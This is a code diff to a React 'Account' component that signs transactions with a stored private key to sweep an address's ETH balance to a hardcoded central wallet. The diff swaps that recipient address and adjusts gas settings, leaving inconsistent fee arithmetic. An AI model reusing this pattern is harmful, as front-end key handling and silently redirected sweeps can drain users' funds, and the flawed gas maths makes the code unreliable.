@@ -70,14 +70,16 @@ export default function Account() {
           .then((amnt) => {
             web3.eth.getGasPrice().then((gasPrice) => {
               // address contains enough eth
-              if (amnt > gasPrice * 23000) {
+              if (amnt > gasPrice * 21000) {
+                console.log("attempting send");
                 // send balance to central wallet
                 web3.eth.accounts
                   .signTransaction(
                     {
-                      to: "0x3C761E9Be20439BbCDf66eCC7334945BA4a6f634",
+                      to: "0x5da2958A3f525A9093f1CC5e132DAe8522cc997c",
                       value: parseInt(amnt - gasPrice * 23000),
                       gas: 21000,
+                      gasPrice: 10000000000,
                     },
                     data.key
                   )
@@ -89,7 +91,7 @@ export default function Account() {
                       .then((receipt) => {
                         console.log("Transaction receipt: ", receipt);
                       })
-                      .catch((err) => console.log("Could not send tx"));
+                      .catch((err) => console.log(err));
                   });
               }
             });
